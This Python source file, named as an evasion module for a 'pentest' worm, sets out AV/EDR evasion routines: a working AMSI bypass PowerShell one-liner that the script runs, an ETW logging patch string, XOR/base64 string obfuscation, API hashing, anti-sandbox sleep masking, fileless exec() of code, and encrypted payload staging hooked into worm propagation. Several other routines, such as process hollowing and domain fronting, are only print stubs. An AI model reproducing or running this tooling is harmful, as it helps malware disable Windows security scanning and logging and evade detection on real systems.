# detection_evasion.py - Advanced Evasion Techniques for Pentest Worms
# Integrates with worm.py for AV/EDR bypass demonstrations

import base64
import zlib
import ctypes
import subprocess
import time
import random
import os
from cryptography.fernet import Fernet

class EvasionEngine:
    def __init__(self):
        self.process_names = [
            "svchost.exe", "lsass.exe", "winlogon.exe", "csrss.exe",
            "notepad.exe", "calc.exe", "explorer.exe"
        ]
    
    def process_hollowing(self, payload):
        """Demo process hollowing technique"""
        print("[+] Process hollowing evasion")
        # Windows API calls for hollowing (educational)
        if os.name == 'nt':
            kernel32 = ctypes.windll.kernel32
            # Simulate hollowing - replace calc.exe image with payload
            print("  - Injecting into legitimate process image")
    
    def api_hashing(self, api_name):
        """Runtime API hashing to evade static analysis"""
        hash_val = 0
        for c in api_name.lower():
            hash_val = ((hash_val * 0x1000193) ^ ord(c)) & 0xFFFFFFFF
        return f"hashed_{hex(hash_val)}"
    
    def string_obfuscation(self, strings):
        """XOR + Base64 string obfuscation"""
        key = b"pentest_evasion_key_2024"
        obfuscated = {}
        for s in strings:
            xored = bytes([a ^ b for a, b in zip(s.encode(), key * (len(s)//len(key)+1))])
            obfuscated[s] = base64.b64encode(xored).decode()
        return obfuscated
    
    def sleep_masking(self, duration):
        """Anti-sandbox sleep obfuscation"""
        print(f"[+] Sleep masking for {duration}s")
        for _ in range(int(duration * 10)):
            time.sleep(0.1)
            # CPU jitter to evade timing analysis
            _ = sum(range(random.randint(100, 1000)))
    
    def amsi_bypass(self):
        """Windows AMSI bypass (PowerShell detection evasion)"""
        if os.name == 'nt':
            print("[+] AMSI Bypass")
            amsi_bypass = """
            [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
            """
            subprocess.run(["powershell", "-ep", "bypass", "-c", amsi_bypass], 
                         capture_output=True)
    
    def etw_patching(self):
        """Event Tracing for Windows patching"""
        print("[+] ETW Patch (evade logging)")
        if os.name == 'nt':
            # Patch common ETW providers
            etw_patch = """
            $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static')
            $etw.SetValue($null, $null)
            """
    
    def fileless_execution(self, code):
        """Execute entirely in memory"""
        print("[+] Fileless execution")
        exec(code)
    
    def network_stealth(self):
        """Domain fronting + jitter timing"""
        domains = ["google.com", "cloudflare.com", "akamai.com"]
        jitter = random.uniform(5, 15)
        print(f"[+] Network stealth: domain fronting + {jitter:.1f}s jitter")
    
    def living_off_the_land(self):
        """Use system binaries only"""
        binaries = [
            "certutil.exe", "bitsadmin.exe", "mshta.exe", 
            "regsvr32.exe", "rundll32.exe", "wmic.exe"
        ]
        print("[+] Living off the land binaries:", ", ".join(binaries[:3]))
    
    def encrypt_payload(self, payload):
        """Fernet encryption for staging"""
        key = Fernet.generate_key()
        f = Fernet(key)
        encrypted = f.encrypt(payload.encode())
        return key, encrypted
    
    def dynamic_decryption(self, key, encrypted_payload):
        """Runtime decryption"""
        f = Fernet(key)
        return f.decrypt(encrypted_payload).decode()

# Integration with main worm
def integrate_evasion(worm_instance):
    """Hook evasion into worm propagation"""
    evader = EvasionEngine()
    
    # Before propagation
    evader.sleep_masking(2)
    evader.living_off_the_land()
    
    # Obfuscate worm code
    obfuscated = evader.string_obfuscation(["worm.py", "pentest"])
    
    # Network evasion
    evader.network_stealth()
    
    print("[+] Evasion suite active")

if __name__ == "__main__":
    evader = EvasionEngine()
    evader.amsi_bypass()
    evader.sleep_masking(3)
    print("Evasion engine ready for pentest deployment")
